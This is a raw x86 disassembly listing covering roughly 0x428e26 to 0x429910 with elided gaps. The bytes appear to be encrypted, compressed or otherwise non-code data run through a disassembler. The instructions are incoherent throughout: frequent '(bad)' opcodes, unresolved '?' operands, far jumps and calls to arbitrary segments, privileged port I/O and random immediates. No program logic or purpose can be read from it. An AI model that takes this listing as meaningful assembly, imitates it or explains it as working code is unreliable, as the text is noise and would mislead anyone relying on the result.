  428e26:	cmp    ebx,DWORD PTR [edi-0x25]
  428e29:	iret   
  428e2a:	dec    eax
  428e2b:	sbb    DWORD PTR [eax],edx
  428e2d:	out    dx,al
  428e2e:	mov    ebp,0x261230c9
  428e33:	or     DWORD PTR [eax-0x27178bab],0x58a1ced5
  428e3d:	and    DWORD PTR [ebx+0x0],0xbafe311e
  428e44:	dec    esi
  428e45:	(bad)  
  428e47:	shl    DWORD PTR ds:0xc9658144,0xe7
  428e4e:	pop    eax
  428e4f:	add    bl,BYTE PTR [eax]
  428e51:	pusha  
  428e52:	ss inc eax
  428e54:	(bad)  ds:0x40f16144
  428e5a:	shl    DWORD PTR cs:[eax-0x7533a6e1],1
  428e61:	sub    al,0x1c
  428e63:	pop    ebp
  428e64:	rol    BYTE PTR [ecx+0x4d044ec7],1
  428e6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428e6b:	xchg   BYTE PTR [edi-0x4a5ee8ed],al
  428e71:	pop    esi
  428e72:	xor    al,0x22
  428e74:	js     0x428e91
  428e76:	ins    BYTE PTR es:[edi],dx
  428e77:	dec    ebx
  428e78:	(bad)  
  428e79:	sbb    eax,0x5d302517
  428e7e:	xor    BYTE PTR [esi],al
  428e80:	sbb    esi,edx
  428e82:	xchg   esp,eax
  428e83:	pop    esi
  428e84:	and    cl,BYTE PTR [eax]
  428e86:	mov    ds,WORD PTR [ebp+0x3]
  428e89:	int    0xb0
  428e8b:	pop    ebx
  428e8c:	ss cli 
  428e8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428e8f:	sub    DWORD PTR [ecx+0x17],ecx
  428e92:	and    al,0x94
  428e94:	xchg   esp,eax
  428e95:	xchg   ecx,eax
  428e96:	push   eax
  428e97:	(bad)  
  428e98:	mov    ah,0x28
  428e9a:	inc    ecx
  428e9b:	fwait
  428e9c:	mov    ebx,0xa87f3c37
  428ea1:	aaa    
  428ea2:	xlat   BYTE PTR ds:[ebx]
  428ea3:	and    dl,BYTE PTR [edx]
  428ea5:	push   DWORD PTR [eax+eax*2+0x64]
  428ea9:	cwde   
  428eaa:	adc    eax,0x4392fc6b
  428eaf:	js     0x428ed1
  428eb1:	test   al,0x44
  428eb3:	(bad)  
  428eb5:	xor    BYTE PTR [esi-0x356cd6ca],dl
  428ebb:	sbb    eax,0x14b14503
  428ec0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  428f31:	add    BYTE PTR [eax],al
  428f33:	add    BYTE PTR [ecx+0x5f2f4ba7],dh
  428f39:	out    dx,eax
  428f3a:	cmc    
  428f3b:	mov    edi,0x37e5e17c
  428f40:	push   ss
  428f41:	add    ecx,DWORD PTR [eax]
  428f43:	lahf   
  428f44:	pop    edx
  428f45:	mov    dl,0x1
  428f47:	add    ch,dh
  428f49:	add    BYTE PTR [eax],al
  428f4b:	add    BYTE PTR [ebx],ch
  428f4d:	adc    al,ch
  428f4f:	xchg   ebx,eax
  428f50:	scas   al,BYTE PTR es:[edi]
  428f51:	jns    0x428f94
  428f53:	mov    eax,0xf8bff25d
  428f58:	cmp    BYTE PTR [eax+0x49],dh
  428f5b:	lods   eax,DWORD PTR ds:[esi]
  428f5c:	mov    bl,0x5d
  428f5e:	inc    edx
  428f5f:	jns    0x428f58
  428f61:	(bad)  
  428f62:	enter  0x5712,0x94
  428f66:	iret   
  428f67:	pop    eax
  428f68:	lahf   
  428f69:	add    eax,0x81b3a3f9
  428f6e:	shl    DWORD PTR [ebp-0x440c4908],cl
  428f74:	or     al,0x70
  428f76:	repnz std 
  428f78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428f79:	sub    BYTE PTR [edi-0x4568be3b],ah
  428f7f:	(bad)  
  428f81:	pushf  
  428f82:	jmp    0x1ddc:0xc577aa5b
  428f89:	jae    0x428f1b
  428f8b:	fst    QWORD PTR [edx+esi*8-0x5f]
  428f8f:	jmp    0x9e09:0xf84f6ac7
  428f96:	dec    ecx
  428f97:	or     al,0x5a
  428f99:	sti    
  428f9a:	jbe    0x428fe5
  428f9c:	mov    esp,?
  428f9e:	in     al,dx
  428f9f:	push   cs
  428fa0:	mov    ch,0x60
  428fa2:	dec    esp
  428fa3:	in     al,0x67
  428fa5:	iret   
  428fa6:	sbb    BYTE PTR [edi],0xfa
  428fa9:	push   ecx
  428faa:	scas   al,BYTE PTR es:[edi]
  428fab:	push   es
  428fac:	fisttp WORD PTR [ebx]
  428fae:	iret   
  428faf:	jmp    0xf3c5:0xbfd5a138
  428fb6:	lds    edx,FWORD PTR [esi+edi*1+0x4e]
  428fba:	mov    al,ds:0xad046c8b
  428fbf:	push   edx
  428fc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428fc1:	sbb    bl,BYTE PTR [edi-0x32]
  428fc4:	add    al,0x7e
  428fc6:	xchg   ecx,eax
  428fc7:	push   0xd872b4eb
  428fcc:	push   edx
  428fcd:	push   ds
  428fce:	lahf   
  428fcf:	add    edx,DWORD PTR [eax+0x28]
  428fd2:	mov    dl,0xba
  428fd4:	adc    BYTE PTR [ebx-0x5ccdb0f3],0xff
  428fdb:	leave  
  428fdc:	sbb    al,0xe4
  428fde:	call   0x9efb:0x70639e77
  428fe5:	xor    DWORD PTR [eax+0x29bff2df],eax
  428feb:	pop    edx
  428fec:	add    BYTE PTR [ebp+0x622dba50],bh
  428ff2:	or     al,0x4f
  428ff4:	ja     0x428f8d
  428ff6:	cmp    BYTE PTR [edi-0x726ffd14],0xf4
  428ffd:	xor    eax,0x1ec39ba0
  429002:	out    dx,eax
  429003:	cmp    eax,0xf99ce602
  429008:	or     cl,ch
  42900a:	pusha  
  42900b:	push   cs
  42900c:	add    ecx,DWORD PTR [edx]
  42900e:	xlat   BYTE PTR ds:[ebx]
  42900f:	mov    eax,edx
  429011:	sar    DWORD PTR [edi+0x63],cl
  429014:	aas    
  429015:	cmp    esp,DWORD PTR [edi]
  429017:	aas    
  429018:	add    eax,0x7e78be8d
  42901d:	sbb    eax,0x8a379c17
  429022:	(bad)  
  429023:	pop    ebp
  429024:	mov    ecx,0x642f391c
  429029:	mov    edx,0x33b7534a
  42902e:	daa    
  42902f:	xchg   edx,esi
  429031:	push   ds
  429032:	mov    WORD PTR [ebp+0x14],fs
  429035:	mov    dl,0x35
  429037:	mov    WORD PTR [edx-0x66],?
  42903a:	retf   0xe7b2
  42903d:	aaa    
  42903e:	xor    ah,ah
  429040:	inc    edi
	...
  4290b1:	add    BYTE PTR [eax],al
  4290b3:	add    bh,bl
  4290b5:	out    dx,al
  4290b6:	std    
  4290b7:	dec    esp
  4290b8:	std    
  4290b9:	pop    edi
  4290ba:	(bad)  
  4290bb:	(bad)  
  4290bc:	mov    edi,0x22b66cf7
  4290c1:	mov    BYTE PTR [ebx-0x49],0x4f
  4290c5:	mov    bl,0x1
  4290c7:	add    ch,dh
  4290c9:	add    BYTE PTR [eax],al
  4290cb:	add    BYTE PTR [ecx+ecx*8+0xb5384e6],dl
  4290d2:	dec    esp
  4290d3:	fcomp  DWORD PTR [ebp-0x262a5cc4]
  4290d9:	sbb    BYTE PTR [eax-0x18],ch
  4290dc:	sbb    BYTE PTR [eax-0x1b1f10ac],dh
  4290e2:	ds jmp 0x450c6ae5
  4290e8:	jl     0x429123
  4290ea:	or     al,0xf3
  4290ec:	xlat   BYTE PTR ds:[ebx]
  4290ed:	jnp    0x429132
  4290ef:	aaa    
  4290f0:	jmp    0x42908e
  4290f2:	xor    ebp,esp
  4290f4:	stos   BYTE PTR es:[edi],al
  4290f5:	ret    
  4290f6:	shl    DWORD PTR [ebx+eax*4],0xc6
  4290fa:	fild   WORD PTR fs:[eax-0x25]
  4290fe:	adc    ah,BYTE PTR [edx+ebp*2]
  429101:	xor    eax,0x5f4fc2a
  429106:	repz xor esi,DWORD PTR [edx+0x42]
  42910a:	loop   0x429090
  42910c:	jns    0x42913c
  42910e:	mov    edi,0x1dd7c281
  429113:	xchg   esi,eax
  429114:	imul   edi,DWORD PTR [esi+0x10],0xffffffca
  429118:	std    
  429119:	xor    edx,DWORD PTR [ecx+0x34]
  42911c:	nop
  42911d:	push   ecx
  42911e:	cmp    eax,0x29904b0
  429123:	jno    0x42912d
  429125:	mov    ah,BYTE PTR [edi]
  429127:	clc    
  429128:	pop    es
  429129:	and    ah,ah
  42912b:	xchg   BYTE PTR [edx],dl
  42912d:	pop    ebx
  42912e:	mov    edi,0xf253671c
  429133:	pushf  
  429134:	stos   DWORD PTR es:[edi],eax
  429135:	xchg   esi,eax
  429136:	(bad)  
  429138:	mov    al,ds:0x67da3c9c
  42913d:	shl    DWORD PTR [esi-0x42],1
  429140:	sub    al,0xad
  429142:	and    al,0x6f
  429144:	add    al,0x41
  429146:	or     DWORD PTR [eax-0x62],esp
  429149:	adc    ecx,DWORD PTR [edi]
  42914b:	add    al,0xd0
  42914d:	mov    esi,0x653045ee
  429152:	mov    es:0x469f8e93,eax
  429158:	push   0x2afd5c6e
  42915d:	sbb    eax,0x38897b41
  429162:	sub    BYTE PTR [ebp-0x23],al
  429165:	rcr    BYTE PTR [eax+ebx*4+0x5e971070],cl
  42916c:	mov    DWORD PTR [esi-0x54],edi
  42916f:	mov    esi,eax
  429171:	inc    ebx
  429172:	adc    eax,0x857d2764
  429177:	mov    esp,0x1a508111
  42917c:	mov    cl,0x91
  42917e:	mov    ds:0x48446286,eax
  429183:	push   eax
  429184:	arpl   WORD PTR [ecx],dx
  429186:	add    BYTE PTR [edi-0x2ea25cb7],dl
  42918c:	(bad)
  429190:	jg     0x4291bd
  429192:	scas   al,BYTE PTR es:[edi]
  429193:	jo     0x429166
  429195:	jge    0x42916f
  429197:	push   edi
  429198:	cli    
  429199:	xor    DWORD PTR [ebx-0x57],edx
  42919c:	sbb    dh,BYTE PTR [esi]
  42919e:	arpl   WORD PTR [ebx+eax*2+0x6e13f869],bp
  4291a5:	mov    esi,0xbc283bae
  4291aa:	inc    ecx
  4291ab:	lock imul edx,DWORD PTR [eax+0x7d],0x5c
  4291b0:	inc    edx
  4291b1:	aas    
  4291b2:	lea    esi,[edi-0x60]
  4291b5:	xor    DWORD PTR [ebp-0x556ba0bc],esi
  4291bb:	jne    0x4291bc
  4291bd:	fiadd  WORD PTR [ebx+0xfa49]
	...
  429233:	add    bh,al
  429235:	fidiv  WORD PTR [esi]
  429237:	loop   0x429278
  429239:	jmp    0x67eb:0x13f5ffd7
  429240:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429241:	pop    edx
  429242:	jp     0x4291d2
  429244:	inc    esp
  429245:	mov    ah,0x1
  429247:	add    ch,dh
  429249:	add    BYTE PTR [eax],al
  42924b:	add    BYTE PTR [ecx+0x16813432],ah
  429251:	ins    BYTE PTR es:[edi],dx
  429252:	aam    0x6f
  429254:	int3   
  429255:	xchg   ebx,eax
  429256:	neg    DWORD PTR ds:0x1b3431ec
  42925c:	add    BYTE PTR [esi+edx*1+0x58],ch
  429260:	pop    ebp
  429261:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429262:	fwait
  429263:	or     eax,0xc416e2e6
  429268:	dec    ecx
  429269:	jbe    0x42924f
  42926b:	mov    ah,0xb1
  42926d:	xchg   edi,eax
  42926e:	sub    eax,0xff761b8f
  429273:	mov    bl,0x42
  429275:	jecxz  0x429256
  429277:	stos   BYTE PTR es:[edi],al
  429278:	sub    al,0x44
  42927a:	adc    eax,0x3d376890
  42927f:	mov    al,dl
  429281:	and    dh,BYTE PTR [edx]
  429283:	stc    
  429284:	pop    eax
  429285:	mov    dl,0xea
  429287:	add    eax,0x7dc71cb3
  42928c:	inc    eax
  42928d:	scas   eax,DWORD PTR es:[edi]
  42928e:	aaa    
  42928f:	stos   BYTE PTR es:[edi],al
  429290:	rcr    BYTE PTR [ebp+0x64],0xda
  429294:	or     al,0x38
  429296:	sub    al,0x8e
  429298:	sbb    DWORD PTR ds:0x967f8b5d,esi
  42929e:	test   eax,0x2f936fd8
  4292a3:	cdq    
  4292a4:	pusha  
  4292a5:	push   ss
  4292a6:	push   esi
  4292a7:	mov    edx,0x80929272
  4292ac:	sbb    al,0x6f
  4292ae:	add    DWORD PTR [edx],ebp
  4292b0:	jl     0x4292e3
  4292b2:	push   eax
  4292b3:	inc    edi
  4292b4:	mov    al,ds:0xf609ce7d
  4292b9:	push   es
  4292ba:	jbe    0x429278
  4292bc:	daa    
  4292bd:	into   
  4292be:	push   ecx
  4292bf:	pop    esp
  4292c0:	fxch   st(4)
  4292c2:	into   
  4292c3:	imul   eax,DWORD PTR [ebx+0x19a3429a],0xb77f11ec
  4292cd:	scas   eax,DWORD PTR es:[edi]
  4292ce:	call   0x2446:0x1a9befc9
  4292d5:	fist   DWORD PTR ds:0x180ee52c
  4292db:	push   es
  4292dc:	je     0x42931b
  4292de:	into   
  4292df:	pop    ebx
  4292e0:	(bad)
  4292e3:	push   esp
  4292e4:	stos   BYTE PTR es:[edi],al
  4292e5:	outs   dx,DWORD PTR ds:[esi]
  4292e6:	popf   
  4292e7:	adc    eax,edx
  4292e9:	dec    esp
  4292ea:	sbb    ebx,esi
  4292ec:	cmp    al,ch
  4292ee:	mov    esp,0x2586890
  4292f3:	hlt    
  4292f4:	xchg   esp,eax
  4292f5:	and    al,0xb2
  4292f7:	xchg   ebx,eax
  4292f8:	(bad)  
  4292fa:	cmp    dl,ch
  4292fc:	sbb    edx,ecx
  4292fe:	jns    0x429290
  429300:	lea    ebx,[eax-0x3c]
  429303:	jl     0x4292f9
  429305:	adc    cl,BYTE PTR [eax-0x64]
  429308:	dec    edi
  429309:	jbe    0x42930e
  42930b:	xchg   edi,eax
  42930c:	or     eax,0xfae1c0d7
  429311:	mov    bh,BYTE PTR [eax]
  429313:	push   ss
  429314:	fldl2e 
  429316:	and    bl,ch
  429318:	clc    
  429319:	ja     0x4292ee
  42931b:	cmp    al,0x9a
  42931d:	jne    0x4292b1
  42931f:	mov    cl,0x32
  429321:	fs jg  0x4292ac
  429324:	icebp  
  429325:	jbe    0x42932f
  429327:	mov    dh,0x2d
  429329:	fwait
  42932a:	mov    eax,0x32869b00
  42932f:	inc    ecx
  429330:	dec    ebp
  429331:	inc    esi
  429332:	into   
  429333:	and    eax,0x718e52a7
  429338:	or     al,bl
  42933a:	ins    BYTE PTR es:[edi],dx
  42933b:	ret    0x58db
  42933e:	cwde   
  42933f:	adc    DWORD PTR [edx+0x0],ecx
	...
  4293b1:	add    BYTE PTR [eax],al
  4293b3:	add    BYTE PTR [esi],cl
  4293b5:	xchg   esp,eax
  4293b6:	jg     0x42941b
  4293b8:	(bad)  
  4293b9:	jmp    0x4293d9
  4293bb:	std    
  4293bc:	jge    0x4293da
  4293be:	in     al,dx
  4293bf:	xchg   edi,eax
  4293c0:	cmp    DWORD PTR [ebp-0x66],ebx
  4293c3:	mov    eax,ds:0x1b539
  4293c8:	cmc    
  4293c9:	add    BYTE PTR [eax],al
  4293cb:	add    BYTE PTR [ecx*2-0x35ff079e],bh
  4293d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4293d3:	cmp    eax,0xd770bf76
  4293d8:	xor    eax,0xcabc5c7f
  4293dd:	mov    edi,0x81b425e3
  4293e2:	or     BYTE PTR [edi],al
  4293e4:	cld    
  4293e5:	(bad)
  4293e8:	jb     0x429407
  4293ea:	aaa    
  4293eb:	jbe    0x429450
  4293ed:	cld    
  4293ee:	dec    ebp
  4293ef:	les    eax,FWORD PTR [esi+eiz*2-0x195a511d]
  4293f6:	xchg   esi,eax
  4293f7:	js     0x42942e
  4293f9:	int    0xc9
  4293fb:	mov    esp,0x4f300024
  429400:	or     ecx,DWORD PTR ds:[edi+edi*1+0x6272ed29]
  429408:	std    
  429409:	jne    0x429481
  42940b:	inc    edx
  42940c:	sbb    esp,esi
  42940e:	mov    esi,0x3b9f55e
  429413:	add    esp,ecx
  429415:	lahf   
  429416:	and    ch,BYTE PTR [ecx]
  429418:	in     al,dx
  429419:	inc    ebp
  42941a:	push   ebp
  42941b:	les    esp,FWORD PTR [edx-0x74e89d6]
  429421:	fiadd  WORD PTR [esi+0x6b91ea5b]
  429427:	ins    BYTE PTR es:[edi],dx
  429428:	add    DWORD PTR [edi+0x6e],ecx
  42942b:	into   
  42942c:	cwde   
  42942d:	add    BYTE PTR [ecx],al
  42942f:	pop    esi
  429430:	dec    DWORD PTR [esi+0x0]
  429433:	mov    ah,0x71
  429435:	out    0x98,al
  429437:	jns    0x429475
  429439:	xchg   ebx,eax
  42943a:	cmp    al,0xfd
  42943c:	mov    eax,ds:0x44fde72e
  429441:	xchg   edx,eax
  429442:	cmp    BYTE PTR [eax-0x3a2e064b],ch
  429448:	test   al,0xc2
  42944a:	push   esp
  42944b:	ret    
  42944c:	xor    eax,0xb55f3b3a
  429451:	retf   
  429452:	int    0x44
  429454:	cdq    
  429455:	xlat   BYTE PTR ds:[ebx]
  429456:	or     al,0xc
  429458:	mov    edi,0x351320f1
  42945d:	sub    ebp,DWORD PTR [esp+edx*4+0x382ec977]
  429464:	and    bh,al
  429466:	jnp    0x429404
  429468:	leave  
  429469:	xchg   BYTE PTR [esi+0x4933fc8a],bh
  42946f:	xchg   edx,ebp
  429471:	sub    eax,0x5a375223
  429476:	lods   eax,DWORD PTR ds:[esi]
  429477:	shl    BYTE PTR [edi],1
  429479:	push   ds
  42947a:	gs jp  0x42948f
  42947d:	cmc    
  42947e:	mov    ebp,0x579a851
  429483:	and    DWORD PTR [ebp-0xd],eax
  429486:	push   es
  429487:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429488:	sahf   
  429489:	mov    eax,0xad7726f1
  42948e:	jg     0x4294f4
  429490:	retf   0xf304
  429493:	adc    eax,0x92766ff3
  429498:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429499:	aam    0x8c
  42949b:	sub    eax,0x136c1842
  4294a0:	lods   eax,DWORD PTR ds:[esi]
  4294a1:	daa    
  4294a2:	cmp    al,0x39
  4294a4:	fdivp  st(2),st
  4294a6:	dec    ecx
  4294a7:	cs sub al,0xa7
  4294aa:	dec    ecx
  4294ab:	arpl   WORD PTR [edi],bp
  4294ad:	jl     0x429442
  4294af:	add    al,0x48
  4294b1:	push   eax
  4294b2:	sbb    al,0x7a
  4294b4:	pop    ebp
  4294b5:	add    al,0xe5
  4294b7:	adc    al,0xeb
  4294b9:	inc    edi
  4294ba:	mov    dh,0x98
  4294bc:	and    ch,BYTE PTR [ebx+esi*8]
  4294bf:	mov    edx,0xf7
	...
  429534:	push   ecx
  429535:	div    BYTE PTR ds:0x5bffb73e
  42953b:	(bad)  
  42953c:	std    
  42953d:	cmp    eax,0xee2cc4f3
  429542:	jl     0x4294c9
  429544:	cs mov dh,0x1
  429547:	add    ch,dh
  429549:	add    BYTE PTR [eax],al
  42954b:	add    BYTE PTR [edx+0x6c],dl
  42954e:	icebp  
  42954f:	push   DWORD PTR [edi-0x4fdda51]
  429555:	xchg   esi,ebp
  429557:	xchg   ebp,eax
  429558:	sti    
  429559:	mov    edx,0xbb6f18b8
  42955e:	xchg   ebx,eax
  42955f:	pop    ebx
  429560:	fsub   st(3),st
  429562:	push   ebx
  429563:	jno    0x4295b2
  429565:	(bad)
  429568:	out    dx,eax
  429569:	mov    edi,0xc7c1c81
  42956e:	jecxz  0x429582
  429570:	sahf   
  429571:	pop    esp
  429572:	cdq    
  429573:	cld    
  429574:	mov    DWORD PTR [ebp-0x5661130f],esp
  42957a:	outs   dx,DWORD PTR es:[esi]
  42957c:	lahf   
  42957d:	mov    ebp,esp
  42957f:	mov    ds:0xc7a11839,al
  429584:	test   DWORD PTR [eax],edi
  429586:	lods   al,BYTE PTR ds:[esi]
  429587:	enter  0xa46e,0xf3
  42958b:	mov    ch,dh
  42958d:	push   ecx
  42958e:	lock xor DWORD PTR ds:0xe9770ffc,eax
  429595:	pop    es
  429596:	fcomp  DWORD PTR [eax+0x370da90e]
  42959c:	loop   0x429606
  42959e:	call   0x86f9fd33
  4295a3:	lods   al,BYTE PTR ds:[esi]
  4295a4:	(bad)  
  4295a5:	or     BYTE PTR [ebx],bl
  4295a7:	test   eax,0x5b6f88cd
  4295ac:	lds    esp,FWORD PTR [edx]
  4295ae:	fwait
  4295af:	xchg   DWORD PTR [eax+edx*4],esp
  4295b2:	add    DWORD PTR [eax],0x7c
  4295b5:	cdq    
  4295b6:	mov    ?,edi
  4295b8:	ss fsub st(6),st
  4295bb:	mov    ah,0xa6
  4295bd:	and    al,al
  4295bf:	jmp    0x4295d9
  4295c1:	arpl   WORD PTR [eax],cx
  4295c3:	push   es
  4295c4:	jmp    0xc321:0xbb0b8bfb
  4295cb:	test   eax,0x7e4454aa
  4295d0:	ins    DWORD PTR es:[edi],dx
  4295d1:	jo     0x42963d
  4295d3:	push   ss
  4295d4:	cdq    
  4295d5:	loope  0x4295a1
  4295d7:	mov    ch,0x39
  4295d9:	cmp    BYTE PTR [esi],al
  4295db:	xchg   esp,eax
  4295dc:	sar    BYTE PTR [ebx+esi*8-0x5f3dbd1],0x5c
  4295e4:	dec    ecx
  4295e5:	inc    esp
  4295e6:	call   0x4e847fd3
  4295eb:	mov    ?,WORD PTR [eax-0x38c58970]
  4295f1:	push   cs
  4295f2:	loop   0x42965e
  4295f4:	les    edx,FWORD PTR [ecx+0x34313777]
  4295fa:	add    BYTE PTR [esi],0x12
  4295fd:	sbb    eax,0xc00e078b
  429602:	dec    edx
  429603:	xor    eax,0x5370d33
  429608:	xor    DWORD PTR [esi],0x27
  42960b:	push   ebx
  42960c:	sbb    BYTE PTR [esi+0x4bb27457],al
  429612:	or     eax,0x24142eb0
  429617:	sub    ebp,DWORD PTR [ebx*8-0x17be28f8]
  42961e:	int3   
  42961f:	stos   BYTE PTR es:[edi],al
  429620:	jl     0x42969f
  429622:	sbb    BYTE PTR [edi],0x52
  429625:	call   esp
  429627:	sub    BYTE PTR [eax-0x55],cl
  42962a:	jp     0x4295c8
  42962c:	xchg   esp,eax
  42962d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42962e:	or     esp,DWORD PTR [ebx-0x2d6d4cd4]
  429634:	mov    edx,0xc683a9e6
  429639:	jl     0x4295db
  42963b:	fdiv   QWORD PTR [ebx]
  42963d:	dec    edi
  42963e:	mov    al,ds:0xcb8
	...
  4296b3:	add    BYTE PTR [esi+0x5b],dl
  4296b6:	xor    al,0x78
  4296b8:	cmp    eax,0x737f5e7f
  4296bd:	ficom  DWORD PTR [ecx+0x4f]
  4296c0:	mov    bh,0xf4
  4296c2:	sub    eax,0x1b72311
  4296c7:	add    ch,dh
  4296c9:	add    BYTE PTR [eax],al
  4296cb:	add    BYTE PTR [ebx-0x57],ch
  4296ce:	outs   dx,BYTE PTR ds:[esi]
  4296cf:	repz mov eax,ds:0x185d36a
  4296d5:	cs cdq 
  4296d7:	adc    al,0x93
  4296d9:	adc    DWORD PTR [ebp+0x51bdb4f3],eax
  4296df:	push   ds
  4296e0:	sub    BYTE PTR [eax-0x29],bh
  4296e3:	call   0x3b31:0xbff6c322
  4296ea:	mov    cl,0xaf
  4296ec:	addr16 inc ebx
  4296ee:	rol    BYTE PTR [ebx+ecx*1],0x1e
  4296f2:	dec    ecx
  4296f3:	jp     0x429734
  4296f5:	push   edi
  4296f6:	icebp  
  4296f7:	mov    al,ds:0x5b2ba0d8
  4296fc:	cli    
  4296fd:	mov    edi,0xe1796560
  429702:	jmp    0x6f7f:0x43ee4057
  429709:	or     ebx,DWORD PTR [esi+0x5f197eba]
  42970f:	mov    eax,0x88f636d7
  429714:	iret   
  429715:	mov    al,BYTE PTR [eax]
  429717:	jle    0x4296e1
  429719:	out    dx,al
  42971a:	call   0x5e47:0x4c980332
  429721:	xchg   ebx,eax
  429722:	leave  
  429723:	lods   al,BYTE PTR ds:[esi]
  429724:	popf   
  429725:	sahf   
  429726:	push   ss
  429727:	cld    
  429728:	and    esp,DWORD PTR [ecx+0x74a4673f]
  42972e:	push   edx
  42972f:	ret    0xadb4
  429732:	add    ch,bh
  429734:	(bad)  
  429735:	jmp    0xfaf9:0x99b04529
  42973c:	pop    esi
  42973d:	mov    eax,0xf4e83cf3
  429742:	sbb    eax,0x4ec689f6
  429747:	jmp    FWORD PTR [esi-0x3f]
  42974a:	sub    al,0xe8
  42974c:	sar    esi,cl
  42974e:	dec    edx
  42974f:	and    eax,0x70597a2a
  429754:	xchg   ecx,eax
  429755:	shl    BYTE PTR [ecx+0x34],cl
  429758:	(bad)  
  42975a:	xor    al,cl
  42975c:	dec    edx
  42975d:	inc    edx
  42975e:	pop    ds
  42975f:	dec    ecx
  429760:	lock push ecx
  429762:	retf   0x9874
  429765:	inc    esi
  429766:	aaa    
  429767:	ret    0x1ded
  42976a:	sbb    ch,bh
  42976c:	retf   
  42976d:	mov    al,ds:0xd4bb189e
  429772:	inc    esi
  429773:	pop    es
  429774:	sub    al,0x1c
  429776:	les    ebp,FWORD PTR [esi+0x1f7471cc]
  42977c:	cdq    
  42977d:	imul   esi,DWORD PTR [edx-0xc],0xfffffffc
  429781:	fistp  DWORD PTR [ebp+0x15]
  429784:	dec    edx
  429785:	mul    BYTE PTR [ebx]
  429787:	mov    WORD PTR [edi+0x66],ss
  42978a:	mov    edi,DWORD PTR [ecx+0x113d1973]
  429790:	mov    bh,0xa
  429792:	(bad)  
  429793:	or     ecx,DWORD PTR [eax-0x1c]
  429796:	in     al,0x40
  429798:	cmp    al,BYTE PTR [edx+0x639d1a3a]
  42979e:	lock dec ebp
  4297a0:	imul   esi,ebx,0xc870f76f
  4297a6:	retf   0xfed4
  4297a9:	rcr    al,0x87
  4297ac:	xchg   ebp,eax
  4297ad:	add    al,0x6f
  4297af:	push   ebp
  4297b0:	retf   
  4297b1:	imul   ebx,DWORD PTR [edi],0xffffff92
  4297b4:	(bad)  
  4297b5:	push   ss
  4297b6:	push   eax
  4297b7:	loope  0x429829
  4297b9:	aam    0xdf
  4297bb:	imul   edi,esi,0xd016623b
	...
  429831:	add    BYTE PTR [eax],al
  429833:	add    BYTE PTR [esi],ah
  429835:	jp     0x4298a8
  429837:	les    edi,FWORD PTR [ebp-0x31]
  42983a:	mov    bh,0xfa
  42983c:	push   0xffffffa8
  42983e:	push   es
  42983f:	adc    DWORD PTR [ebp+0x2f],edi
  429842:	lea    eax,[eax+ebx*1-0x48]
  429846:	add    DWORD PTR [eax],eax
  429848:	cmc    
  429849:	add    BYTE PTR [eax],al
  42984b:	add    al,al
  42984d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42984e:	sti    
  42984f:	(bad)  
  429850:	mov    ebp,0x7bfd2827
  429855:	stos   BYTE PTR es:[edi],al
  429856:	xchg   esp,eax
  429857:	mov    ebp,0xd2b1105c
  42985c:	jae    0x42989c
  42985e:	sahf   
  42985f:	ss or  ecx,esi
  429862:	enter  0xc094,0xb4
  429866:	mov    dl,0x81
  429868:	fstp   QWORD PTR [esi+0x152f4b07]
  42986e:	xchg   ebx,eax
  42986f:	pop    esi
  429870:	cwde   
  429871:	ret    
  429872:	dec    edx
  429873:	fistp  WORD PTR [ebx-0x3f]
  429876:	mov    bh,0xeb
  429878:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429879:	mov    edx,0xc97b2645
  42987e:	pop    eax
  42987f:	mov    al,ds:0x5969b1f0
  429884:	jae    0x429901
  429886:	leave  
  429887:	adc    BYTE PTR [ebx],0xd8
  42988a:	and    esi,DWORD PTR [ecx+0x68e6f85]
  429890:	retf   
  429891:	mov    ah,0xd2
  429893:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429894:	push   cs
  429895:	pop    es
  429896:	pop    edi
  429897:	addr16 xor al,0x48
  42989a:	xchg   edi,eax
  42989b:	inc    ebp
  42989c:	jbe    0x429840
  42989e:	call   0x433f:0x1d15f740
  4298a5:	enter  0x4213,0xe6
  4298a9:	out    dx,al
  4298aa:	mov    ds:0x8bf1abaa,al
  4298af:	(bad)  
  4298b0:	dec    edi
  4298b1:	lds    edx,FWORD PTR [edx]
  4298b3:	fcom   DWORD PTR [edi-0xe]
  4298b6:	push   esp
  4298b7:	dec    esi
  4298b8:	test   al,0x17
  4298ba:	int3   
  4298bb:	dec    edx
  4298bc:	mov    al,BYTE PTR [ebx+0xa]
  4298bf:	test   dl,dl
  4298c1:	xlat   BYTE PTR ds:[ebx]
  4298c2:	fimul  WORD PTR [ebx]
  4298c4:	push   esp
  4298c5:	outs   dx,DWORD PTR ds:[esi]
  4298c6:	adc    BYTE PTR [esi-0x76a81542],0xd9
  4298cd:	sar    edi,1
  4298cf:	and    bh,BYTE PTR [eax+0x2d53e4b4]
  4298d5:	adc    al,0x89
  4298d7:	pop    ds
  4298d8:	mov    dl,al
  4298da:	test   DWORD PTR [edx-0x54],esi
  4298dd:	popf   
  4298de:	mov    dl,BYTE PTR [ebp+0x4]
  4298e1:	xor    al,0x96
  4298e3:	cmc    
  4298e4:	and    dl,BYTE PTR [esi]
  4298e6:	ins    DWORD PTR es:[edi],dx
  4298e7:	rcr    DWORD PTR [ecx],0xdd
  4298ea:	mov    ah,0xa9
  4298ec:	and    DWORD PTR [edx+ebx*2],esp
  4298ef:	into   
  4298f0:	add    dl,BYTE PTR [ebx]
  4298f2:	sub    BYTE PTR [ecx],ah
  4298f4:	jecxz  0x4298a4
  4298f6:	or     al,0x2f
  4298f8:	js     0x42992f
  4298fa:	call   0x90d80a50
  4298ff:	shl    BYTE PTR [edi+0x7d401fab],cl
  429905:	ret    0x5d8d
  429908:	inc    edi
  429909:	pushf  
  42990a:	scas   eax,DWORD PTR es:[edi]
  42990b:	mov    al,0x8a
  42990d:	dec    esp
  42990e:	mov    dl,0x6f
  429910:	aas    
